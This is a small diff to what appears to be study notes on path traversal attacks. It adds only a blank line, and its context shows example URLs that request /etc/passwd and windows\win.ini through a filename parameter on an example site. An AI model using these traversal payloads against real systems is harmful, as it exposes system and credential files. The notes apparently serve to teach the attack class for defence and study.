@@ -5,6 +5,7 @@
 Location: /var/www/images/
 
 Attack: `https://insecure-website.com/loadImage?filename=../../../etc/passwd`
+
 Windows: `https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`
 
 ## Absolute path:
